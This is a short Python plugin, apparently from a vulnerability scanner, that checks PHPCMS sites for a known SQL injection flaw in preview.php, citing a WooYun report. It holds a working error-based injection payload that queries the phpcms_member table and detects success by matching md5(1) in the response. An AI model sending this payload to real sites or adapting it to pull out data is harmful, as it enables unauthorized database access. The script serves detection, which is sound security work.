#!/usr/bin/env python
# -*- coding: utf-8 -*-
#by range
#refer:http://www.wooyun.org/bugs/wooyun-2013-022112

import re

def assign(service, arg):
    if service == "phpcms":
        return True, arg

def audit(arg):
    url = arg
    payload = "/preview.php?info[catid]=15&content=a[page]b&info[contentid]=2' and (select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,md5(1),0x3a,md5(1),0x27,0x7e) from phpcms_member limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)-- a"
    code, head, res, errcode, _ = curl.curl("\"%s\"" % (url + payload))
    m = re.search('c4ca4238a0b923820dcc509a6f75849b',res)
    if m:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('phpcms', 'http://www.example.com/')[1])